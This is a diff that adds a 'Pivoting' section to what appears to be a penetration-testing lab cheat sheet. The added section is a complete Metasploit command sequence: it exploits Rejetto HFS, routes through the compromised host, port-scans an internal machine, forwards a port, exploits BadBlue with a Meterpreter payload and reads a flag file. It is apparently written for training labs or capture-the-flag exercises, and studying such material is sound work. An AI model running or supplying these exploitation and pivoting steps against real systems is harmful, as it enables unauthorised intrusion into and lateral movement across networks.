@@ -2192,7 +2192,37 @@ use auxiliary/analyze/crack_linux
 set SHA512 true
 run
 ```
-
+116) Pivoting
+```
+cat /root/Desktop/target
+nmap 10.0.23.180
+nmap -sV -p 80 10.0.23.180
+searchsploit hfs
+msfconsole -q
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS 10.0.23.180
+exploit
+ipconfig
+run autoroute -s 10.0.23.0/20
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.0.27.99
+set PORTS 1-100
+exploit
+sessions -i 1
+portfwd add -l 1234 -p 80 -r 10.0.27.99
+portfwd list
+nmap -sV -sS -p 1234 localhost
+searchsploit badblue 2.7
+use exploit/windows/http/badblue_passthru
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOSTS 10.0.27.99
+exploit
+shell
+cd /
+dir
+type flag.txt
+```
 
 
 
